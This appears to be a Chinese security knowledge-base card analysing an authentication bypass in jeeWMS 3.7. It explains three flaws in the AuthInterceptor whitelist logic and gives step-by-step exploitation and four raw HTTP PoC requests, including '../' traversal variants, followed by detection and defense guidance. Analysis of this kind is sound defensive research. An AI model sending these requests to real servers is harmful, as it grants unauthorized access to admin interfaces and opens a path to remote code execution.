---
id: web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass
title: jeeWMS AuthInterceptor 白名单三处逻辑缺陷：正则放行全部 rest 路由、contains 子串放行与 ? 参数绕过
type: scenario
domain: web
path: web/generic/auth
technique: interceptor-whitelist-regex-contains-bypass
aliases:
- jeeWMS 鉴权绕过
- AuthInterceptor 绕过
- rest 白名单绕过
- excludeContainUrls 绕过
- wmsApiController.do 绕过
tags:
- jeewms
- java
- spring
- interceptor
- auth-bypass
- access-control
- whitelist
- path-traversal
cve: []
severity: critical
confidence: high
status: verified
affected_versions: jeeWMS 3.7（原文复现 commit 580e924afed5a...）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V39
  verified_at: '2026-11-05T06:27:59+08:00'
  notes: 已对照原文与43张图核对：web.xml 两 DispatcherServlet（图02）、AuthInterceptor preHandle 正则 ^rest/[a-zA-Z0-9_/]+$ 放行 + excludeUrls.contains + moHuContain 子串（图03/04）、ResourceUtil.getRequestPath 保留 ? 仅截断 &（图05）；?wmsApiController.do 参数拼接与白名单段 ../ 穿越示例与原文一致。未验证点：未本机复现，原文未给逐条 403/200 对比；原文明确漏洞存在版本 3.7，affected_versions 保留；frontmatter 无 sources/source_url。
---

## 一句话结论

jeeWMS 的 `AuthInterceptor.preHandle()` 用三条宽松规则放行请求：`requestPath.matches("^rest/[a-zA-Z0-9_/]+$")` 把所有不含 `.`/`?` 的 `/rest/*` 路由整体放行；`excludeContainUrls` 用 `key.contains(str)` 做子串匹配，只要 URL 任意位置含 `wmsApiController.do` 即可绕过；而 `ResourceUtil.getRequestPath()` 只截断 `&` 不截断 `?`，使 `cgUploadController.do?wmsApiController.do` 这类参数拼接也能命中白名单。三者叠加导致大量后台接口未授权可访问，并直接支撑后续四种 RCE。

## 原理

- `web.xml` 配了两个 DispatcherServlet：`springMvc` 映射 `*.do`/`*.action`，`restSpringMvc` 映射 `/rest/*`；两者共用 `spring-mvc.xml` 中的 `AuthInterceptor`，`<mvc:mapping path="/**"/>` 全局拦截。
- `preHandle()` 第一步：
  ```java
  String requestPath = ResourceUtil.getRequestPath(request);
  if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
      return true;
  }
  ```
  该正则只允许字母、数字、下划线和 `/`，所以 `rest/cgUploadController`、`rest/commonController`、`rest/dynamicDataSourceController` 等全部直接通过；含 `.do` 或 `?` 的 rest 路径反而不匹配。
- `getRequestPath()` 先拼 `requestURI + "?" + queryString`，再 `substring(0, indexOf("&"))` 去掉 `&` 之后的参数，最后去掉 contextPath。它不会截断 `?`，因此 `requestPath` 中会保留 `?query`。
- 白名单判断：
  ```java
  if (excludeUrls.contains(requestPath)) return true;
  else if (moHuContain(excludeContainUrls, requestPath)) return true;
  ```
  `moHuContain` 是 `key.contains(str)`：只要 `requestPath` 中包含 `wmsApiController.do` 或 `systemController/showOrDownByurl.do` 任一子串就放行。于是 `/jeewms/cgUploadController.do?wmsApiController.do` 被当作包含白名单串而放行。
- 还可用路径穿越：`/jeewms/wmsApiController.do/../cgUploadController.do`、`/jeewms/systemController/showOrDownByurl.do/../../cgUploadController.do`。原始 URI 含白名单子串，容器规范化后落到目标控制器。
- 对 `/rest/*` 的请求，因为 `?` 会被正则排除，所以攻击者必须把参数放在请求体中（`application/x-www-form-urlencoded` 或 multipart），不能放在 query string。

## 触发条件

- 目标为 jeeWMS 3.7（文章环境为 2026-03-19 的 commit `580e924afed5a...`）。
- `AuthInterceptor` 按上述 `spring-mvc.xml` 配置启用，且目标接口只依赖该拦截器做鉴权。
- 目标控制器存在危险操作（文件上传、文件写入、JDBC 连接、解压等）。
- 对于 rest 路由，攻击者能用请求体传参；对于 `.do` 路由，可以在 query 中拼接白名单子串。

## 利用步骤

1. 阅读 `web.xml` 与 `spring-mvc.xml`，确认两个 DispatcherServlet 和 `AuthInterceptor` 的 `excludeUrls`/`excludeContainUrls`。
2. 审计 `preHandle()` 与 `ResourceUtil.getRequestPath()`，找出正则、精确匹配、子串匹配三处放行逻辑。
3. 对于 `/rest/*` 控制器：直接访问 `rest/<controller>`，把参数放进请求体。
4. 对于 `*.do` 控制器：在 query 中拼接 `wmsApiController.do`，如 `/jeewms/cgUploadController.do?wmsApiController.do`；或在路径中插入白名单段加 `../`。
5. 验证未授权：不带 Cookie/Session 请求后台接口，观察是否返回业务数据或执行成功。
6. 将未授权入口接到后续 RCE sink（上传、PUT 写文件、JDBC、解压）。

## PoC

```http
POST /jeewms/rest/cgUploadController HTTP/1.1
Host: target:8081
Content-Type: application/x-www-form-urlencoded

saveFiles=1&cgFormId=1&cgFormName=ba_act_type&cgFormField=id
```

```http
POST /jeewms/cgUploadController.do?wmsApiController.do HTTP/1.1
Host: target:8081
Content-Type: application/x-www-form-urlencoded

saveFiles=1&...
```

```http
POST /jeewms/wmsApiController.do/../cgUploadController.do HTTP/1.1
Host: target:8081
```

```http
GET /jeewms/systemController/showOrDownByurl.do/../../cgUploadController.do HTTP/1.1
Host: target:8081
```

## 变体与关联

- 变体：`excludeUrls` 精确匹配可被 `?` 后参数影响；若某条白名单值本身带 `?`，可构造相同前缀的其它参数。
- 变体：利用 `;` 路径参数、URL 编码 `%2e%2e`、`//`、尾部 `/` 触发容器与拦截器路径解析差异。
- 关联卡片：[[web-generic-auth-interceptor-login-prefix-dotdot-bypass]]（startsWith 前缀 + `..` 绕过）、[[web-generic-file-upload-jeewms-cgupload-extension-upload]]、[[web-generic-file-upload-jeewms-tokencontroller-saveimage-traversal]]、[[web-generic-file-upload-jeewms-cgformtemplate-zipslip-templatecode]]、[[web-java-deserialization-jeewms-dynamicdatasource-testconnection-jdbc]]。
- 关联：通用 `contains`/`startsWith` 鉴权判断与路由规范化不一致问题。

## 检测与防御

- 检测：请求路径中出现 `wmsApiController.do` 但实际路由到其它控制器；路径含 `/../`、`;`、`%2e`；未带会话访问 `/rest/*` 后台接口并成功返回业务数据。
- 检测：同一 IP 在未登录状态调用上传、数据源测试、解压等后台接口；拦截器日志中 `requestPath` 与实际 handler 不一致。
- 防御：白名单改为精确匹配规范化后的路径；禁止 `contains`/`startsWith`/正则宽泛匹配；先 `getServletPath()`/规范化路径再鉴权，拒绝 `..`、`;`、编码路径。
- 防御：默认拒绝（deny by default），只显式放行登录等必要接口；在控制器层再做一次角色/权限校验，不把拦截器当唯一防线。
- 加固：升级/修补 jeeWMS；对 `/rest/*` 统一要求认证；限制后台接口暴露面。
- 响应：审计未授权访问日志，排查上传目录、数据源配置、解压目录的异常变更。
